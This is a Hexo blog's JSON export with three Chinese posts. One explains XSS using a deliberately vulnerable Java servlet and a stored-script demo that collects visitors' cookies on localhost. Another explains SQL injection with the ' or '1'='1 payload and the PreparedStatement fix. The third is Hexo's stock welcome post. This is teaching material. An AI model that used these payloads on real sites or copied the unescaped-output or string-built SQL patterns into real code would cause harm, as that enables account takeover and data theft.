[{"title":"XSS 小结","date":"2016-09-16T06:00:26.000Z","path":"2016/09/16/XSS总结/","text":"前言上一篇文章中写了关于项目中处理SQL盲注的安全漏洞.其中也提到了XSS.这篇文章就来说一下XSS 是怎么来进行攻击的,如何对其进行防御. 概览XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。 XSS是一种经常出现在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。比如这些代码包括HTML代码和客户端脚本。攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击“，而JavaScript是新型的“ShellCode”。 `XSS`攻击的危害包括: 1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 3、盗窃企业重要的具有商业价值的资料 4、非法转账 5、强制发送电子邮件 6、网站挂马 7、控制受害者机器向其它网站发起攻击 —-摘自百度百科 XSS攻击 原理我们首先搭建一个简易的环境来模拟XSS 攻击 ,其中xssTest.jsp 代码如下 模拟XSS攻击实例1:12345678910111213141516171819&lt;%@ page language=\"java\" contentType=\"text/html; charset=utf-8\" pageEncoding=\"utf-8\"%&gt;&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"&gt;&lt;title&gt;Insert title here&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"xssTestServltet\" method=\"get\"&gt; &lt;input type=\"txt\" name=\"userName\"&gt; &lt;input type=\"submit\" value=\"提交\"&gt; &lt;/form&gt; &lt;hr&gt; 您输入的账户为: $&#123;userName &#125;&lt;/body&gt;&lt;/html&gt; 后台处理 xssTestServlter.java1234567891011121314@WebServlet(\"/xssTestServltet\")public class XssTestServltet extends HttpServlet&#123; @Override protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; //接受参数 String userName=request.getParameter(\"userName\"); //存储数据到 作用域 request.setAttribute(\"userName\", userName!=null?userName:\"\"); //跳转到原页面. request.getRequestDispatcher(\"/xssTest.jsp\").forward(request, response); &#125;&#125; 然后我们请求到测试页面 我们尝试输入 qazxc110,得到的结果为: 此时页面源代码为: 我们注意到,我们的输入的字符被原封不动的显示在 15行的位置.那么我们试想一下,如果我们在输入框中输入 这样一段代码:&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;,会是什么样子.按照刚才的测试,那么这次源码中在刚才的位置就应该显示&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 这串代码相当于在展示的位置插入了一段javaScript 代码,那么就应该执行alert弹出弹窗 并打印 xss. 我们按照刚才的假设,在代码中实验.我们输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 这串代码在文本框中,然后提交页面.然后我得到了一下页面: 这时我们看到浏览器出现了弹窗,说明刚才的那段script 代码执行了.这个时候也就基本说明了,页面存在XSS 漏洞了.此时的页面源码为: 这是一种非常简单的方式.我们只是在页面上弹窗一个字符串而已,显然是执行了 &lt;script&gt;&lt;/script&gt;中的代码.那么这里面不但可以写弹窗代码,还可以写其他比如让页面跳转到一个指定的地址.如果这个地址的页面是一个跟当前页面相似的钓鱼页面的话,后果不堪设想. 很多网站都有留言模块.我们可以在留言板上插入一段恶意的代码,提交到后台.由于这段代码是保存在服务器上,若管理员并没有去及时发现并删除这段留言的代码,当范文留言列表的时候,留言会被加载出来.当用户访问这个留言的页面时,这段恶意代码就会执行.实例如下: 模拟XSS攻击实例2:12345678910111213141516171819202122232425/** * 原页面访问地址. * */@WebServlet(\"/xssTestServltet\")public class XssTestServltet extends HttpServlet&#123; @Override protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; //接受参数 String userName=request.getParameter(\"userName\"); //存储数据到 作用域 request.setAttribute(\"userName\", userName!=null?userName:\"\"); //模拟存储一个cookie 到 客户端.在xss 攻击链接中获取. Cookie cookie = new Cookie(\"xxzx\",\"1234\"); response.addCookie(cookie); //模拟数据库中存储的留言. request.setAttribute(\"ly1\", \"xxzx\"); //模拟数据库中存储的留言.这里插入了一段 script 代码.去访问src 对应的xss 攻击 链接. request.setAttribute(\"ly2\", \"&lt;script src='http://localhost:8080/XssTestServlet2'&gt;&lt;/script&gt;么么哒\"); //跳转到原页面. request.getRequestDispatcher(\"/xssTest.jsp\").forward(request, response); &#125;&#125; 123456789101112131415161718192021/** * 模拟留言中 xss 攻击的 地址. * */@WebServlet(\"/XssTestServlet2\")public class XssTestServlet2 extends HttpServlet&#123; @Override protected void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; System.out.println(\"访问了攻击地址.......\"); //得到cookies Cookie[] cookies = request.getCookies(); for (Cookie cookie : cookies) &#123; System.out.println(\"name:\"+cookie.getName()); System.out.println(\"value:\"+cookie.getValue()); &#125; &#125;&#125; 这时我们任意用户在浏览器中访问 留言页面时,页面的代码: 在留言2 的后面,还去加载了一个 我们之前定义好的XSS 链接 .这样一来我们除了请求正常的地址,页面还另外请求了攻击的地址: 而在我们XSS 攻击地址的后台.我们获取到了这些信息: 当管理员进入后台来浏览留言时,就会触发,然后管理员的cookie 后后台地址 等等一系列信息都可以被拿到,然后攻击者就可以用一些cookie欺诈工具来更改管理员的cookie ,就可以不用输入账号,密码 也可以以管理员的身份登录进系统. 解决方案","tags":[{"name":"web安全","slug":"web安全","permalink":"https://heyxyw.github.io/tags/web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://heyxyw.github.io/tags/XSS/"}]},{"title":"SQL盲注","date":"2016-09-16T06:00:26.000Z","path":"2016/09/16/SQL盲注/","text":"前言在前段时间项目拿去做了一个入网安全测试,结果测出来例如SQL盲注,跨站点脚本攻击(XSS),跨站点伪造(CSRF) 等一系列问题.今天先对解决SQL盲注 问题做一个小的总结. 问题SQL盲注,相信大家都不会怎么陌生,如果没听说过得话,那么肯定听说过SQL注入.SQL盲注 是一种Web 系统的安全漏洞,属于比较严重的那种.SQL注入有很多种方式,而SQL盲注就是SQL注入的其中一种方式. 在安全级别中,SQL盲注是一种威胁程度很高的安全漏洞.用SQL查询语句去猜解表名、字段、数据等信息，使用外部输入来构造SQL 命令的全部或一部分，如果在用户输入中没有对SQL语法充分地除去或引用，那么生成的SQL可绕过安全性检查，或者插入其他用于修改后端数据库的语句，或者执行系统命令。错误的SQL也会被调用，并返回请求响应，攻击者利用这些漏洞进行系统攻击。 注入实例://请求地址 String getUrl=&quot;xxx.jsp?user=admin&amp;amp;password=1&apos; or &apos;1&apos;=&apos;1 &quot;; //接收参数 String user=request.getParameter(&quot;user&quot;); String password=request.getParameter(&quot;password&quot;); //拼装sql String checkSql=&quot;select count(*) from user where username=&apos;&quot;+user+&quot;&apos; and password =&apos;&quot;+password+&quot;&apos;&quot;; 获取参数合成后的sql变成了 select count(*) from users where userid=&apos;admin&apos; and passwd=&apos;1&apos; or &apos;1&apos;=&apos;1&apos; 这条SQL将会返回所有的记录数。 示例代码://注册驱动 Class.forName(&quot;com.mysql.jdbc.Driver&quot;); //获取链接对象 Connection conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/jdbcdemo&quot;,&quot;root&quot;,&quot;admin&quot;); //模拟账号 String user=&quot;zhouq&quot;; //模拟密码 String password=&quot;1&apos; or &apos;1&apos;=&apos;1&quot;; //拼接 statement 需要执行的 sql StringBuilder sqlByStatement=new StringBuilder(&quot;select count(*) from user where &quot;); sqlByStatement.append(&quot; username=&apos;&quot;).append(user).append(&quot;&apos;&quot;); sqlByStatement.append(&quot; and password=&apos;&quot;).append(password).append(&quot;&apos;&quot;); //准备 PreparedStatement 执行的预编译 sql String sqlByPrepareStatement=&quot;select count(*) from user where username=? and password=?&quot;; Statement statement = conn.createStatement(); ResultSet query = statement.executeQuery(sqlByStatement.toString()); System.out.println(&quot;账户:&quot;+ user); System.out.println(&quot;密码:&quot;+ password); System.out.println(&quot;===========华丽的分割线===========&quot;); if(query.next()){ long count = query.getLong(1); System.out.println(&quot;Statement 查询结果:&quot; + count); } PreparedStatement ps = conn.prepareStatement(sqlByPrepareStatement); //设置第一个参数 ps.setString(1, user); //设置第二个参数 ps.setString(2, password); ResultSet resultSet = ps.executeQuery(); if(resultSet.next()){ long count = resultSet.getLong(1); System.out.println(&quot;PrepareStatement 查询结果: &quot; + count); } //资源关闭 操作... // 输出结果:账户:zhouq 密码:1&apos; or &apos;1&apos;=&apos;1 ===========华丽的分割线=========== Statement 查询结果:1 PrepareStatement 查询结果: 0 解决方案SQL注入攻击 是利用设计上的漏洞,在目标服务器上运行SQL语句进行攻击,动态生成SQL语句时没有对用户输入的数据进行验证是SQL注入攻击得逞的主要原因. 对于JDBC而言,SQL注入攻击只对 Statement 有效,对PreparedStatement是无效的,这是因为PreparedStatement不允许在插入时改变查询的逻辑结构.绕过验证,但这种手段只对Statement有效,对PreparedStatement无效. 尽量使用PreparedStatement 执行sql .例如上面的 SQL 查询语句.在 Statement 中 的sql 语句: select count(*) from user where username=&#39;admin&#39; and passwd=&#39;1&#39; or &#39;1&#39;=&#39;1&#39;.然后 statement.executeQuery(sql) 执行 ,在PreparedStatement 中 的sql 语句: select count(*) from user where username=? and password=? ,然后再对对应的 ? 赋值.Statement 是将整个sql 语句作为一个字符串链接到一起执行.PreparedStatement 中则 将 1&#39; or &#39;1&#39;=&#39;1 做为一个字符串 赋值给第二个 ? ,作为 “密码” 字段对应的值.这样一来 ,sql 注入就不存在了. 使用 ORM 框架. 如 Mybatis在 Mybatis 框架中. #{xx} ,使用的是PreparedStatement ,会有类型转换.也是比较安全的.select count(*) from user where username=#{username} and password=#{password}最终编译的sql为:select count(*) from user where username=? and password=? 结语：以上的这些,只是对最终sql 的处理.如果想彻底的防止SQL盲注 的系统.那么我们还需要对用户发过来的请求进行过滤,其中请求中的参数值很有可能包括一些危险的字符,这些字符就是我们需要去过滤处理的问题了.关于处理危险字符这些问题,又会涉及到 其他的漏洞 比如 XSS ,CSRF 等等.","tags":[{"name":"web安全","slug":"web安全","permalink":"https://heyxyw.github.io/tags/web安全/"},{"name":"SQL盲注","slug":"SQL盲注","permalink":"https://heyxyw.github.io/tags/SQL盲注/"}]},{"title":"Hello World","date":"2016-09-16T05:30:30.649Z","path":"2016/09/16/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]